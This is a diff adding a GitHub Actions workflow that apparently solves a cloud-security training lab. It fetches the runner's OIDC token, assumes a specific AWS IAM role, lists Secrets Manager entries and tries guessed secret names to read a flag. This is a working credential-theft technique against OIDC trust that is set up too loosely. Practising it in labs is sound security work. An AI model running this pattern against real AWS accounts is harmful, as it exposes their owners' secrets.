@@ -1,0 +1,78 @@
+name: STS Lab 2 - Full Debug and Execute
+
+on:
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  validate-and-execute:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Step 1 - Validate Repository Name
+        id: validate
+        run: |
+          echo "Current repository: ${{ github.repository }}"
+          
+          if [[ "${{ github.repository }}" =~ hacktricks-training ]]; then
+            echo "✓ Repository name is valid"
+            echo "valid=true" >> $GITHUB_OUTPUT
+          else
+            echo "✗ Repository name is invalid"
+            echo "✗ Must contain 'hacktricks-training'"
+            echo "✗ Current: ${{ github.repository }}"
+            echo "valid=false" >> $GITHUB_OUTPUT
+            exit 1
+          fi
+
+      - name: Step 2 - Get and Inspect OIDC Token
+        if: steps.validate.outputs.valid == 'true'
+        run: |
+          TOKEN=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r '.value')
+          
+          echo "Token claims:"
+          echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | jq .
+
+      - name: Step 3 - Assume Role
+        if: steps.validate.outputs.valid == 'true'
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::067186171322:role/sts-lab-2-target
+          aws-region: us-east-1
+          audience: sts.amazonaws.com
+
+      - name: Step 4 - Verify Identity
+        if: steps.validate.outputs.valid == 'true'
+        run: |
+          echo "Successfully assumed role!"
+          aws sts get-caller-identity
+
+      - name: Step 5 - List Secrets
+        if: steps.validate.outputs.valid == 'true'
+        run: |
+          echo "Listing secrets..."
+          aws secretsmanager list-secrets
+
+      - name: Step 6 - Get Flag
+        if: steps.validate.outputs.valid == 'true'
+        run: |
+          echo "Attempting to retrieve flag..."
+          
+          # 嘗試常見名稱
+          for secret_name in flag sts-lab-2-flag challenge-flag secret lab-flag flag_sts_lab_2; do
+            echo "Trying: $secret_name"
+            if aws secretsmanager get-secret-value --secret-id "$secret_name" 2>/dev/null; then
+              echo "Found flag in secret: $secret_name"
+              break
+            fi
+          done
+          
+          # 如果上面都失敗，列出並嘗試第一個 secret
+          FIRST_SECRET=$(aws secretsmanager list-secrets --query 'SecretList[0].Name' --output text)
+          if [ "$FIRST_SECRET" != "None" ] && [ ! -z "$FIRST_SECRET" ]; then
+            echo "Trying first secret: $FIRST_SECRET"
+            aws secretsmanager get-secret-value --secret-id "$FIRST_SECRET"
+          fi
